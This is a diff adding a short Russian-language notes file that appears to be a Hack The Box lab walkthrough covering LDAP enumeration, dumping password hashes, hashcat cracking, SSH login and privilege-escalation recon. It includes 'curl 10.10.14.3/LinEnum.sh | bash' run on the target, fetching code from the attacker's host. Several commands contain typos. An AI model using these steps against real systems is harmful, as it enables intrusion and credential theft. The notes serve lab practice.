@@ -1,0 +1,54 @@
+https://www.youtube.com/watch?v=yQgtDoCDAYk&list=PLidcsTyj9JXJKC2u55YVa5aMDBRXsawhr&index=5
+
+
+389/port ldap 
+
+в hosts - add ip 10.10.10.113 exwmpl.com exempl
+
+gobuster -u http://10.101.10.119 - w /usr/share/wordlist/dirbuster/....  
+
+curl 10.10.10.119
+nmap -p 80 10.10.10.119
+
+autentificate to ldap Anonymus
+ldapsearch -x -h 10.10.10.119
+
+ldapsearch -x -h 10.10.10.119 -s base nameingcontexs
+
+если выаодиться nameingcontexs то вставляем в следующий запрос
+
+ldapsearch -x -h 10.10.10.119 -b 'dc=lingtweight,dc=htb'
+
+должны получить дамп пользователей и паролей
+
+hashcat --example-hashes
+нам нужно определить по какому алгоритму зашифровано, как правило по начальным значениям можно определить как зашифровано
+ищим совпадения. 1800 или другой 
+
+./hashcat -m 1800 hashcat/lin.shadow /opt/wordlist/rockyou.txt
+hashcat/lin.shadow - передайом файл с хешами(каждый хеш должен начинаться с новой строки)
+
+***************************************************************************************
+
+В данном задании есть возможность зайти под пользователем 10.10.10.4
+ssh 10.10.10.4@10.10.10.119
+pass:10.10.10.4
+
+анализируем что доступно
+ls -la
+cat /etc/passwd
+смотрим какие пользватели есть и вкаких групах
+
+find . -type f
+*****************************************************************************************
+
+запускаеь  LinEnum.sh передадим на сервер python -m SimpleHTTPServer 80
+
+на целевой машине делаем 
+curl 10.10.14.3/LinEnum.sh | bash
+
+
+
+
+
+
